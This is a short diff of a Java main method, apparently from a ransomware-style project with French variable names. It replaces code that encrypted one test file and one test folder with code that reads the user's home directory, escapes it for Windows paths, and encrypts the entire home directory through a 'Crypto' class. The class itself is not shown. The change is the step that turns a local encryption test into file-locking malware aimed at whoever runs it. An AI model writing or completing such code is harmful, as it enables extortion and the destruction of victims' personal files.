@@ -3,13 +3,9 @@ import java.io.File;
 public class App {
     public static void main(String[] args) throws Exception {
 
-        File fichierAEncrypter = new File("/home/mekju/Documents/fichierToEncrypt.txt");
-        File dossierAEncrypter = new File("/home/mekju/Documents/dossierAEncrypter/");
+        String nomSessionWindows = System.getProperty("user.home").replace("\\" , "\\\\");
+        Crypto.encrypt(new File(nomSessionWindows));
 
-        crypto.encryptDossier(dossierAEncrypter);
-        //crypto.decryptDossier(dossierAEncrypter);
-
-        //crypto.encryptFichier("akchdjrieuhfncmd", fichierAEncrypter);
-        //crypto.decryptFichier("akchdjrieuhfncmd", fichierAEncrypter);
     }
 }
+
